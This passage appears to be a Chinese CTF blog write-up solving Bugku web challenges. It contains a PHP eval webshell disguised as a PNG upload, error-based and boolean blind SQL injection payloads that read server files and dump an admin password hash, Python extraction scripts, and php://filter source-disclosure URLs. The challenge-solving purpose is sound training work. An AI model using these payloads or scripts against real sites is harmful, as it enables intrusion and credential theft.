+<h3 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h3><p>网址：<a href="http://118.89.219.210:49166/" target="_blank" rel="noopener">http://118.89.219.210:49166/</a></p>
+<p>页面url：<a href="http://118.89.219.210:49166/index.php?file=hello.php" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=hello.php</a></p>
+<p>熟悉的文件包含，试一下利用php://filter读取index.php源码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/118.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>天真！！！看来貌似过滤了什么，试一下读取hellp.php，还是一样的结果，看来这个方法行不通，怎么办呢，这时候看一下失败页面的源码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/119.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现提示了文件upload.php</p>
+<p>访问<a href="http://118.89.219.210:49166/upload.php" target="_blank" rel="noopener">http://118.89.219.210:49166/upload.php</a></p>
+<p>发现是文件上传，要求只能上传图片文件，burp抓包上传一句话试试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/120.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现过滤了文件名和类型，但是因为有文件包含，我们只要能将一句话包含在文件上传上去就行，将php文件后缀修改为png，文件类型修改为image/png，上传成功后访问图片所在地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/121.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到代码显示了出来，说明是不符合php语法的代码，仔细看发现php代码开头的&lt;?php ?&gt;被过滤了</p>
+<p>那么换一种方法，上传代码为&lt;?=@eval($_POST[‘cmd’]);</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/122.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>上传成功，访问页面为空，说明代码成功执行</p>
+<p>然后再用burp POST参数cmd执行命令</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/123.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/124.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>获得flag</p>
+<h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><p>网址：<a href="http://120.24.86.145:8002/flagphp/" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/</a></p>
+<p>点击页面Login按钮没反应，看一下源代码只是个按钮，用burp试着POST提交user和password参数也没有显示其他的东西，想到题目给的提示：hint，试着访问hint.php，没有结果，题目是flag.php，访问，也没有提示</p>
+<p>一番思考，试着GET参数hint，没想到就给出了源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>); </span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>) </span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> type=<span class="string">"text/css"</span>&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div class="container" align="center"&gt; </span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">&#125; </span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那就变成一道代码审计题了，要我们在COOKIE字段中添加ISecer参数，值是$KEY序列化后的值</p>
+<p>先写个demo，把$KEY序列化后的值打印出来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$KEY = <span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">$cookie = serialize($KEY);</span><br><span class="line"><span class="keyword">echo</span> $cookie;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/125.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>然后用burp提交cookie</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/126.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>没反应…很奇怪，想了很久，看了好久源代码才发现，$KEY值是定义在最后面的，前面是为空的，所以应该提交空字符串的序列化值…很坑</p>
+<p>空字符串序列化值：s:0:””;</p>
+<p>再次burp提交</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/127.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>拿到flag</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>网址：<a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">http://103.238.227.13:10088/</a></p>
+<p>根据题目的提示，这是一个数字型注入，注入点为GET的参数id，过滤了关键词：空格，单引号，双引号，union，–</p>
+<p>空格可以用%0a替代，union被过滤了那么就用题目的意思：报错注入，注释可以用%23代替–</p>
+<p>直接输入?id=1%23试试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/128.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现正常显示，那么id就没有被引号包裹，其实就无所谓单双引号被过滤了</p>
+<p>那么我们就可以开始爆库了，输入：</p>
+<p>?id=1%0aand%0aextractvalue(1,concat(0x3a,database(),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/129.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>数据库名为sql4</p>
+<p>爆表，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/130.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>表名为temp</p>
+<p>爆列，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=0x74656d70),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/131.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>列名为id,title</p>
+<p>爆数据，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(title)%0afrom%0atemp),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/132.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>没发现flag…</p>
+<p>说明flag不在数据库里，回到题目页面，又看到了提示，查询文件在/var/test/key_1.php </p>
+<p>说明可能要用mysql的load_file函数读取文件内容，再通过hex函数转化为十六进制数</p>
+<p>输入?id=1%0aand%0aextractvalue(1,concat(0x3a,hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),0x3a))%23</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/133.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到没有全部读取，这就是extractvalue函数的缺点，只能读取32位</p>
+<p>这时候就需要利用substr函数每次截取30位读</p>
+<p>先读取前30位</p>
+<p>输入?id=1%0aand%0aextractvalue(1,concat(0x3a,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30),0x3a))%23</p>
+<p>再读取31~60位，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30),0x3a))%23</p>
+<p>依次类推</p>
+<p>最后得到298位十六进制数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3C3F70687020666473616661736664736166696473616664736169666473616B666473616966647361666473616664736166647361666B6473613B6664736166647361667364616664736166617330686664736739466C61673A22373234396635613766643164653630326233306536663339616561363139336122667364616673616664736166647361666473616661203F3E0A</span><br></pre></td></tr></table></figure>
+<p>转化成字符串得：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:<span class="string">"7249f5a7fd1de602b30e6f39aea6193a"</span>fsdafsafdsafdsafdsafa <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到 Flag:”7249f5a7fd1de602b30e6f39aea6193a”</p>
+<h3 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h3><p>网址：<a href="http://118.89.219.210:49167/" target="_blank" rel="noopener">http://118.89.219.210:49167/</a></p>
+<p>登录界面，随便输入一个用户名1，密码1，提示用户名不存在，输入admin,密码1，提示密码错误，猜测有检查用户名是否存在的判断，猜测注入点在admin,输入admin’，提示用户不存在，输入admin’#，提示密码错误，很显然admin被单引号包裹</p>
+<p>那么理清思路，这是字符型注入，注入点在admin,admin被单引号包裹，题目提示我们这是一题基于布尔的盲注</p>
+<p>那么我们试试输入admin’ and 1=1#，发现提示了出现非法字符,oh no ，我们直接输入and，同样提示出现非法字符，看来and被过滤了，那不用and了，我们用异或^</p>
+<p>输入admin’^1#，提示用户名不存在，输入admin’^0#，提示密码错误，很好，那么就可以利用这个提示信息进行基于布尔的盲注</p>
+<p>接下来就是搞定逻辑语句了，正常来说我们是用语句ascii(substr(database(),1,1))=数字，但是尝试就发现了，这题还过滤了逗号，等号，等号可以用不等号&lt;&gt;代替，那么用ascii(substr(database() from 1 for 1))=数字，这样可以吗，又发现for和空格被过滤了…</p>
+<p>怎么办，借鉴了别人的思路，才发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/134.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>如图所示，语句ascii(substr(database()from(1)))就可以输出数据库名第一位的ascii值</p>
+<p>那么思路就很清晰了，根据输入admin’^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#，根据返回的信息，如果返回了”password error!” ，说明数字2就是数据库的第数字1位的ascii值</p>
+<p>直接上脚本，注出数据库名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.89.219.210:49167/index.php'</span></span><br><span class="line">all_string = <span class="string">'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin'^(ascii(substr(database()from(%d)))&lt;&gt;%d)#"</span>%(i,ord(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Log In'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure>
+<p>数据库名：blindsql</p>
+<p>本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜</p>
+<p>看别人猜的表名为admin，列名为password，真是玄学…</p>
+<p>那就直接爆password：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.89.219.210:49167/index.php'</span></span><br><span class="line">all_string = <span class="string">'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#"</span>%(i,ord(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Log In'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of password is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure>
+<p>得password：51b7a76d51e70b419f60d3473fb6f900</p>
+<p>还得拿去md5解密，解密得skctf123456</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/135.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>获得flag</p>
+<h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>网址：<a href="http://120.24.86.145:8002/webshell/" target="_blank" rel="noopener">http://120.24.86.145:8002/webshell/</a></p>
+<p>啥提示都没有，只有url有个提示webshell，试着扫一下后台</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/136.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现shell.php</p>
+<p>进去要输入密码才能看到flag，不是sql，只能burp爆破密码，爆破出来密码是hack</p>
+<h3 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h3><p>网址：<a href="http://120.24.86.145:9002/" target="_blank" rel="noopener">http://120.24.86.145:9002/</a></p>
+<p>看着像是sql二次注入，但是死活找不到注入点，id一直不知道处理，试着扫一下后台</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/137.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>访问一下show.php</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Bugkuctf-Web/138.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>直接给出了flag</p>
+<h3 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h3><p>网址：<a href="http://120.24.86.145:9011/" target="_blank" rel="noopener">http://120.24.86.145:9011/</a></p>
+<p>看页面像是文件上传，但是尝试上传png文件，jpg文件都上传不了，再看看url有个op参数，看着有点像是文件包含，试着用php伪协议读一下文件看看能不能读出来，payloads:</p>
+<p><a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=index" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=index</a></p>
+<p>这里不用加php后缀名，读出了index.php的base64源码</p>
+<p>base64解码得</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">'FROM_INDEX'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$op = <span class="keyword">empty</span>($_GET[<span class="string">'op'</span>]) ? <span class="string">'home'</span> : $_GET[<span class="string">'op'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_string($op) || preg_match(<span class="string">'/\.\./'</span>, $op))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try it again and I will kill you! I freaking hate hackers!'</span>);</span><br><span class="line">ob_start(<span class="string">'ob_gzhandler'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_top</span><span class="params">($op)</span> </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;Panduploader::<span class="meta">&lt;?</span>= htmlentities(ucfirst($op)); <span class="meta">?&gt;</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id=<span class="string">"header"</span>&gt;</span><br><span class="line">		&lt;center&gt;&lt;a href="?op=home" class="logo"&gt;&lt;img src="images/logo.jpg" alt=""&gt;&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div id=<span class="string">"body"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fatal</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">?&gt;&lt;div class="article"&gt;</span><br><span class="line">&lt;h2&gt;Error&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?</span>=$msg;<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_bottom</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">	&lt;div id=<span class="string">"footer"</span>&gt;</span><br><span class="line">		&lt;div&gt;</span><br><span class="line">			&lt;p&gt;</span><br><span class="line">				&lt;span&gt;<span class="number">2017</span> &amp;copy; &lt;/span&gt; All rights reserved.</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;<span class="meta">&lt;?php</span></span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">register_shutdown_function(<span class="string">'page_bottom'</span>);</span><br><span class="line"></span><br><span class="line">page_top($op);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">include</span> $op . <span class="string">'.php'</span>))</span><br><span class="line">    fatal(<span class="string">'no such page'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再读取home.php，<a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=home" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=home</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class="article"&gt;</span><br><span class="line">    &lt;h2&gt;Welcome!!&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        We let you upload PNG image files <span class="keyword">and</span> store it!&lt;br/&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        Get started by &lt;a href=<span class="string">"?op=upload"</span>&gt;uploading a picture&lt;/a&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>
+<p>发现又包含了common.php，不急，先读upload.php的源代码，<a href="http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=upload.php" target="_blank" rel="noopener">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=upload.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; <span class="keyword">isset</span>($_FILES[<span class="string">'image'</span>])) &#123;</span><br><span class="line">    $fn = $_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $ft = $_FILES[<span class="string">'image'</span>][<span class="string">'type'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!is_uploaded_file($fn)) &#123;</span><br><span class="line">        fatal(<span class="string">'uploaded file corrupted'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = <span class="keyword">array</span>(<span class="string">'image/png'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($ft,$array))&#123;</span><br><span class="line">        fatal(<span class="string">"Sorry, only PNG files are allowed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $imagekey = create_image_key();</span><br><span 